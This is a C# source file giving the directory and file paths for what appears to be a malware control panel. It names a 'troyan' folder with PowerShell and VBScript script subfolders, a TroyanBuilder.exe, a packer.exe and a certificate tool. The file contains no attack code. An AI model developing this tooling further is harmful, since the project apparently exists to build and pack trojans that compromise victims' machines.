using model;

namespace Commons;

/// <summary>Panel filesystem layout derived from <see cref="IHephaestusPathResolver"/>.</summary>
public sealed class PanelServerPaths : IPanelServerPaths
{
    private readonly IHephaestusPathResolver _resolver;

    public PanelServerPaths(IHephaestusPathResolver resolver) => _resolver = resolver;

    private static string StartDir => Path.GetFullPath(AppContext.BaseDirectory);

    public void EnsureLayout() => _resolver.EnsureDirectories(StartDir);

    public string HephaestusDataRoot => _resolver.ResolveHephaestusDataRoot(StartDir);

    public string RootData => _resolver.ResolveHephaestusDataBase(StartDir);

    public string DefaultsEmbedDir => _resolver.DefaultsEmbedDirectory(StartDir);

    public string RootDir => _resolver.ResolveRepositoryRoot(StartDir);

    public string SourceCertDir => _resolver.CertDirectory(RootDir);

    public string HephaestusTlsPfxPath => _resolver.FileUnderCert(RootDir);

    public string CpDir => Path.Combine(RootDir, "panel", "cp");

    public string AdsDir => Path.Combine(RootDir, "ads");

    public string PhpDir => Path.Combine(RootDir, "php");

    public string CertDir => _resolver.CertDirectory(RootDir);

    public string SysDir => Path.Combine(RootDir, "sys");

    public string TroyanDir => Path.Combine(RootDir, "troyan");

    public string TroyanScriptDir => Path.Combine(TroyanDir, "troyanps");

    public string TroyanVbsDir => Path.Combine(TroyanDir, "troyanvbs");

    public string TroyanBuilder => Path.Combine(RootDir, "output", "TroyanBuilder.exe");

    public string Packer => Path.Combine(RootDir, "output", "packer.exe");

    public string CertTool => Path.Combine(RootDir, "output", "CertTool.exe");

    public string ServerDir => _resolver.ServerDirectory(StartDir);

    public string DataFile => Path.Combine(ServerDir, "server.json");

    public string UserDataDir => ServerDir;

    public string UserDataFile(string file) => Path.Combine(UserDataDir, file);

    public string UserDataBody => UserDataFile("body.txt");
}
